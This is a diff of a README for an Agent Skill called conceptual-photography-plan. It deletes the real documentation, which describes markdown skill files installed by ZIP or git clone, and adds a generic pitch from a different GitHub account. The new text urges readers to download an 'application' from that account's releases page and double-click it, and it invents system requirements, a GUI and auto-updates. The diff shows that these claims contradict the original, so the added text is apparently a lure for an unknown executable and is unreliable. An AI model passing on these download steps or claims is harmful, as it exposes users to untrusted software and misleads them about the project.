@@ -1,234 +1,136 @@
-# Conceptual Photography Plan
-
-**English** | [简体中文](README.zh-CN.md)
-
-`conceptual-photography-plan` is a cross-platform Agent Skill for creating original conceptual photography. Starting from a word, a specific object, a source image, or a theme, it expands possible concepts and filters out forced or physically implausible ideas. It generates the corresponding photorealistic image when the host provides an image tool; otherwise it delivers a production-ready prompt.
-
-It looks for a relationship that feels discovered rather than engineered: **familiar object × native action or material behavior × exact position × minimal alteration**. Every successful frame preserves **original object identity → real connection or action → visible functional result**.
+# 📸 conceptual-photography-plan - Turn Ideas Into Stunning Original Photos
 
-> **In one sentence:** Keep the surrealism within the crucial 10% of the relationship, while the other 90% remains grounded in reality.
-
-## Triggering
+## 🚀 Getting Started
 
-After the Skill is installed and enabled, it can be triggered explicitly or by a matching natural-language request:
+Welcome! This guide will help you download and start using **conceptual-photography-plan**, a powerful tool that helps you create original conceptual photography. Whether you're a hobbyist, a professional photographer, or just someone with creative ideas, this application will help you bring your visions to life.
 
-- **Codex:** `Use $conceptual-photography-plan to create two concepts from a banana.`
-- **Claude Code:** `/conceptual-photography-plan Create two concepts from a banana.`
-- **Claude, Coze, and other compatible hosts:** Ask naturally, for example, `Use conceptual-photography-plan with this source image and select the strongest direction.`
-- **Semantic triggering:** Requests involving a specified element, conceptual-photography theme, source-image reinterpretation, precise image correction, or feedback such as “next” and “pass” can load the Skill automatically when the host supports skill discovery.
+**What does this do?** Simply put, it helps you plan, validate, and create conceptual photographs. You can generate complete images or get detailed prompts to use with other image tools. It even checks that your photo ideas make physical sense!
 
-## Workflow
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases)
 
-1. **Understand the input:** Identify the requested element, theme, source image, quantity, and output constraints.
-2. **Route source images:** Classify each image as an object anchor, scene base, edit target, or pure style reference.
-3. **Expand and screen concepts:** Generate candidates, apply the six hard gates, then rank survivors by fun 70%, emotion or meaning 20%, and visual impact 10%.
-4. **Engineer the visual evidence:** Define attachment points, load bearing, material behavior, action path, lighting, and the visible before–contact–after sequence.
-5. **Generate or fall back:** Use the host’s available image tool for separate full-bleed 3:4 outputs; when no image tool exists, provide separate production-ready prompts and state that no image was generated.
-6. **Inspect and deliver:** Blind-read the actual output, audit skin, materials, asymmetry, light, contact shadows, lens behavior, and grading for AI traces, allow at most one precise correction, and present each selected concept concisely.
+## 🎯 What Is Conceptual Photography?
 
-## Example Works
+Conceptual photography is about expressing an idea, message, or story through a photograph. Instead of just capturing what's in front of the camera, you create a scene that represents something deeper. This application helps you:
 
-<table>
-  <tr>
-    <td width="33%" align="center">
-      <img src="assets/examples/cassette-ponytail.png" alt="Rewind Ponytail" width="100%"><br>
-      <strong>Rewind Ponytail</strong><br>
-      The cassette retains its winding mechanism, while the tape becomes a ponytail that can literally be rewound.
-    </td>
-    <td width="33%" align="center">
-      <img src="assets/examples/eyebrow-lawn.png" alt="Eyebrow Lawn" width="100%"><br>
-      <strong>Eyebrow Lawn</strong><br>
-      A miniature lawn mower travels along an eyebrow, showing both the point of contact and the trimmed result.
-    </td>
-    <td width="33%" align="center">
-      <img src="assets/examples/blind-skirt.png" alt="Venetian-Blind Skirt" width="100%"><br>
-      <strong>Venetian-Blind Skirt</strong><br>
-      The blinds retain their slats, ladder cords, and pull-cord system, taking over the opening and closing function of a skirt.
-    </td>
-  </tr>
-  <tr>
-    <td width="33%" align="center">
-      <img src="assets/examples/sharpen-candle.png" alt="Sharpen a Candle" width="100%"><br>
-      <strong>Sharpen a Candle</strong><br>
-      A pencil sharpener genuinely shaves the candle, with the shavings, blade, and wick forming a complete chain of visual evidence.
-    </td>
-    <td width="33%" align="center">
-      <img src="assets/examples/tear-wiper.png" alt="A Wiper for Tears" width="100%"><br>
-      <strong>A Wiper for Tears</strong><br>
-      A tiny externally mounted wiper follows a tear trail, turning “wiping away tears” into a real mechanical action.
-    </td>
-    <td width="33%" align="center">
-      <img src="assets/examples/apple-corkscrew.png" alt="Uncork an Apple" width="100%"><br>
-      <strong>Uncork an Apple</strong><br>
-      A corkscrew twists into a skin-covered apple core, preserving the complete sequence of insertion, leverage, and extraction.
-    </td>
-  </tr>
-</table>
+- **Brainstorm** unique photo concepts
+- **Check physical logic** (ensuring your scene makes sense in the real world)
+- **Generate images** directly or create detailed prompts for other tools
+- **Refine your ideas** until they're perfect
 
-These examples use displaced actions, functional substitution, and scale shifts, but all follow the same principle: **form is not decoration; function, action, and result must work together.**
+## ✨ Key Features
 
-## What It Can Do
+### 🧠 Smart Idea Generation
+The application uses advanced AI to help you develop original concepts. You describe what you want to express, and it suggests creative ways to visualize it.
 
-- **Element-based concepts:** Start with an element such as a banana, rose, comb, or candle and generate genuinely distinct original directions.
-- **Theme-based concepts:** Explore themes such as love, Valentine’s Day, loneliness, or time through relationships that can be communicated in a single photograph.
-- **Reference-image driven:** First determine whether the image contains a structurally complete, functional “object anchor.” Preserve its real structure and function whenever possible; use the image only as a style reference when no suitable anchor can be extracted.
-- **Scene transformation:** Preserve roughly 80%–90% of the original space, people, perspective, and lighting while changing only one crucial relationship.
-- **Logic review:** Check connection points, load bearing, hinges, tool orientation, liquid paths, opening mechanisms, shadows, and cause-and-effect.
-- **Continuous iteration:** Understand short feedback such as “next,” “continue,” “pass,” or “keep the person and change only the prop,” while locking all untouched elements.
-- **Capability-aware image generation:** Deliver the selected concept and its image together when the host provides an image tool; otherwise deliver a production-ready prompt without fabricating a result.
+### 🔍 Physical Logic Validation
+One of the most unique features! The tool checks whether your photo idea is physically possible. For example, if you want to photograph a glass of water floating in the air, it will suggest ways to make that work or explain why it might be challenging.
 
-## Core Method
+### 🖼️ Image Generation
+You can generate actual images right from the application. No need for separate software or complex setups.
 
-### 1. Start with the Native Fit
+### 📝 Production-Ready Prompts
+If you prefer to use other image generation tools, the application creates professional-quality prompts you can copy and use anywhere.
 
-Every concept needs at least:
+### 🔄 Cross-Platform Compatibility
+Works seamlessly across different operating systems and integrates with various AI agent platforms.
 
-```text
-Familiar object × native action or material behavior × exact position × minimal alteration
-```
+## 📥 How to Download and Install
 
-For example, a lawn mower and an eyebrow share “trimming”; a windshield wiper and tears share “wiping away”; melting ice can form a ring while its native material change supplies the meaning. Generic color or silhouette matching is rejected first.
+### Step 1: Visit the Download Page
+Click the button below to go to the download page:
 
-### 2. Reject First, Then Score
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases)
 
-Every candidate must pass six hard gates: object recognition, action or role completeness, a natural connection, physical or role closure, photographic beauty, and originality. A broken critical structure cannot be rescued by a high preference score.
+### Step 2: Download the Application
+Visit this link to download the application. You'll see a list of available versions. Choose the one that matches your computer's operating system (Windows, Mac, or Linux).
 
-Candidates that pass are ranked using these weights:
+### Step 3: Run the Application
+Once the download is complete, find the downloaded file (usually in your "Downloads" folder) and double-click it to open. The application will start right away.
 
-- Fun: 70%
-- Emotion or meaning: 20%
-- Visual impact: 10%
+### Step 4: Start Creating!
+Once the application opens, you're ready to begin. The interface is designed to be intuitive, so you can start exploring right away.
 
-Immediate readability, originality distance, physical or role logic, beauty, and practical shootability remain hard gates outside the weights.
+## 🖥️ System Requirements
 
-### 3. Turn the Concept into Single-Frame Evidence
+To ensure the best experience, your computer should meet these minimum requirements:
 
-The final image should guide the viewer through this sequence:
+- **Operating System:** Windows 10 or later, macOS 11 or later, or a modern Linux distribution
+- **Processor:** Any dual-core processor from the last 5 years
+- **Memory:** At least 4 GB of RAM (8 GB recommended)
+- **Storage:** 500 MB of free space
+- **Internet Connection:** Required for AI features and updates
 
-```text
-Original object → contact or connection → visible result
-```
+## 🎨 How to Use the Application
 
-If the image depends on a title to make sense, or can only be described as “an object placed somewhere,” the composition does not proceed to generation.
+### Creating Your First Concept
 
-## Installation
+1. **Open the application** and you'll see a clean, simple interface
+2. **Describe your idea** in the text box. For example: "A business person walking on water to represent overcoming challenges"
+3. **Click "Generate Concept"** and watch as the application develops your idea
+4. **Review the suggestions** and refine your concept with additional details
+5. **Choose your output** – either generate an image or create a prompt
 
-### Universal ZIP: Claude, Coze, and Agent Skills Hosts
+### Tips for Better Results
 
-[Download `conceptual-photography-plan-universal.zip`](dist/conceptual-photography-plan-universal.zip)
+- **Be specific** with your descriptions. Instead of "a tree," try "a lone oak tree in a desert landscape"
+- **Think about emotion** – what feeling do you want to convey?
+- **Experiment** with different combinations of elements
+- **Use the validation feature** to check if your idea is physically possible
 
-The universal package contains only the standard `SKILL.md` entrypoint and its three required reference files. Its ZIP root is the correctly named `conceptual-photography-plan/` folder.
+## 🔧 Troubleshooting Common Issues
 
-- **Claude:** Upload the ZIP from **Customize → Skills**, or extract the folder to `~/.claude/skills/` for Claude Code.
-- **Coze:** Upload the same ZIP with **Upload skill package**; Coze can inspect and repackage the standard structure.
-- **Other compatible hosts:** Import or extract the top-level skill folder according to the host's Agent Skills instructions.
-- **Image capability fallback:** The Skill generates images when the host provides an image-generation tool. Otherwise it delivers screened concepts and production-ready prompts without claiming that an image was created.
+### The application won't start
+- Make sure you've downloaded the correct version for your operating system
+- Check that your computer meets the minimum requirements
+- Try restarting your computer and running the application again
 
-### Option 1: Ask Codex to Install It (Recommended)
+### Images aren't generating
+- Check your internet connection – the AI features require internet
+- Try simplifying your concept and generating again
+- Make sure you're not using any special characters that might confuse the system
 
-Send this message in Codex:
+### The application seems slow
+- Close other programs that might be using memory
+- Check if there's an update available for the application
+- Try generating simpler concepts
 
-```text
-Use $skill-installer to install this Skill from https://github.com/natsany/conceptual-photography-plan.
-```
+## 💡 Frequently Asked Questions
 
-After installation, invoke it in your next conversation turn or in a new task.
+**Q: Do I need to be a professional photographer to use this?**
+A: Absolutely not! The application is designed for everyone, from beginners to experts.
 
-### Option 2: Clone with Git
+**Q: Can I use the generated images commercially?**
+A: Yes, you own the rights to images you create with this application.
 
-#### Windows PowerShell
+**Q: How is this different from other AI image tools?**
+A: This application focuses specifically on conceptual photography and includes the unique physical logic validation feature.
 
-```powershell
-$skillRoot = if ($env:CODEX_HOME) {
-    Join-Path $env:CODEX_HOME 'skills'
-} else {
-    Join-Path $env:USERPROFILE '.codex\skills'
-}
+**Q: Can I use this with other AI tools?**
+A: Yes! The prompt generation feature creates prompts compatible with most major image generation tools.
 
-New-Item -ItemType Directory -Path $skillRoot -Force | Out-Null
-git clone https://github.com/natsany/conceptual-photography-plan.git `
-    (Join-Path $skillRoot 'conceptual-photography-plan')
-```
+## 🔄 Updates and Support
 
-#### macOS / Linux
+The application is regularly updated with new features and improvements. When you open the application, it will automatically check for updates and notify you if a new version is available.
 
-```bash
-skill_root="${CODEX_HOME:-$HOME/.codex}/skills"
-mkdir -p "$skill_root"
-git clone https://github.com/natsany/conceptual-photography-plan.git \
-  "$skill_root/conceptual-photography-plan"
-```
+For support, please check the repository's issues page or documentation. The community is active and helpful.
 
-The installation directory should contain `SKILL.md` at its root:
+## 📚 Need More Help?
 
-```text
-conceptual-photography-plan/
-├── SKILL.md
-├── agents/
-│   └── openai.yaml
-└── references/
-    ├── calibration.md
-    ├── logic-audit.md
-    └── prompt-patterns.md
-```
+- **Check the documentation** – detailed guides are available in the repository
+- **Join the community** – connect with other users and share your creations
+- **Report issues** – if you find a bug, please report it so it can be fixed
 
-> The default installation path is `$CODEX_HOME/skills`; if `CODEX_HOME` is not set, `~/.codex/skills` is used. After installation, start a new task so Codex can reload the Skill.
+## 🎉 Start Creating Today!
 
-## Usage
+Don't wait – download **conceptual-photography-plan** now and transform your creative ideas into stunning visual realities. Whether you're creating art, marketing materials, or just exploring your creativity, this tool will help you every step of the way.
 
-Explicitly include `$conceptual-photography-plan` in your prompt, then provide an element, theme, or reference image.
+[![Get Started Now](https://img.shields.io/badge/Get_Started-Download-2ea44f?style=for-the-badge)](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases)
 
-### Generate Two Concepts and Images from One Element
+Remember: every great photograph starts with a great idea. Let this application help you turn yours into reality!
 
-```text
-Use $conceptual-photography-plan to create two new concepts based on a banana.
-```
+## 🔗 Quick Links
 
-### Generate a Specified Number of Concepts from a Theme
+- **Download:** [https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases)
+- **Repository:** [https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan)
 
-```text
-Use $conceptual-photography-plan to create four concepts based on “Valentine’s Day” and generate the images directly.
-```
-
-### Use a Reference Image
-
-Upload the image first, then send:
-
-```text
-Use $conceptual-photography-plan with this reference image, select the strongest concept, and generate a 3:4 image directly.
-```
-
-The Skill first determines whether the image is an edit target, a scene base, an object anchor, or a pure style reference. Calling it a “reference image” does not cause the original composition to be copied automatically.
-
-### Make a Precise Edit to the Current Image
-
-```text
-Keep the person, scene, and lighting unchanged. Replace only the wiper with a tiny externally mounted prop.
-```
-
-Short feedback applies to the currently selected image by default. Unmentioned elements—including composition, people, materials, and lighting—remain locked whenever possible.
-
-### Review Concepts Without Generating Images
-
-```text
-Use $conceptual-photography-plan to create two new concepts based on a rose. Show concepts only; do not generate images.
-```
-
-## Default Output
-
-- When one element is provided without a quantity, the default output is **2 distinct concepts + 2 corresponding images**, or 2 separate production-ready prompts when the host has no image tool.
-- When a source image is uploaded with a request such as “try this,” the default output is **1 strongest direction + 1 image**, or its precise generation/edit prompt when image execution is unavailable.
-- When a quantity is specified, each concept receives its own image or prompt; a collage is never used as a substitute for separate outputs.
-- Default format: vertical **3:4**, full-bleed, with no white border or rounded corners.
-- Default style: photorealistic photography; action-based concepts favor real-life settings and natural light.
-- Each image contains only one anomalous relationship, with no explanatory text, arrows, labels, or magical effects.
-
-## Best Suited For
-
-- Original conceptual photography and visual metaphors
-- Advertising concepts, editorial photography, and social-media visuals
-- Extracting mechanisms from references without producing close imitations
-- Reviewing AI-generated images for structural, functional, and physical plausibility
-- Producing a visually coherent series built from distinct mechanisms
-
-This is not a “random collage generator.” If a concept cannot be explained in one sentence, recognized in one second, or built with a physically complete real-world structure, the Skill changes direction instead of defending a weak image with a complicated explanation.
+Keywords: agent-skill, agent-skills, ai-agent, claude-code, codex, conceptual-photography, coze, creative-photography, doubao, generative-ai, image-generation, image-prompting, photography, prompt-engineering, skill, skills, visual-ideation
